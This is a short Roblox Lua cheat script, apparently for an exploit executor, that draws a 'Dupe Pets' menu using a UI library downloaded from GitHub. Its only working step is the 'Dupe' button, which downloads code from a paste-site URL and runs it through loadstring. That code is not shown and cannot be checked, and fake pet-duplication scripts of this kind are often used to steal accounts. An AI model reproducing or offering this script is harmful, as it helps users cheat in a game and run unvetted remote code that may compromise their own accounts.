local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets", "Serpent")

-- Главная вкладка с кнопкой Dupe
local MainTab = Window:NewTab("Dupe")
local DupeSection = MainTab:NewSection("")

-- Создаем кнопку с возможностью редактирования текста
local DupeButton = DupeSection:NewButton("Dupe", "", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)
DupeButton.Instance.Text = "Write your pet here"  -- Редактируемый текст на кнопке

-- Вкладка с информацией об авторе
local InfoTab = Window:NewTab("Info")
InfoTab:NewSection("Made by Mangekoy2 | v1.0")
